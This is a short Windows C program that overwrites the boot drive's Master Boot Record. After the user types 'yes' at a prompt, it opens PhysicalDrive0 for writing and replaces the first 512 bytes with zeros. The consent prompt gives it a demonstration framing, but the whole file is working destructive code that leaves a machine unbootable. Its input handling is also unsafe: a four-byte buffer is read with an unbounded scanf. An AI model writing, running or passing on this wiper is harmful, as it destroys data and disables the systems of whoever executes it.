#include <stdio.h>
#include <windows.h>

#define BUFF_SIZE 512

int main()
{
    char ans[4];
    DWORD written;
    printf("This program will overwrite your MBR! Do you want to run it? (yes/no): ");
    scanf("%s", ans);

    if(strcmp(ans, "yes") != 0)
    {
        printf("Exiting...");
        Sleep(2000);
    }else if(strcmp(ans, "yes") == 0)
    {
        HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);

        if(mbr == INVALID_HANDLE_VALUE)
        {
            printf("Can't access MBR...Exiting...");
            Sleep(3000);
            ExitProcess(0);
        }

        const char trash_data[BUFF_SIZE];
        ZeroMemory(trash_data, BUFF_SIZE);

        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE)
        {
            printf("MBR overwritten! :-)");
            Sleep(3000);
        }else
        {
            printf("Error...Exiting...");
            Sleep(3000);
        }

        CloseHandle(mbr);
    }
    return 0;
}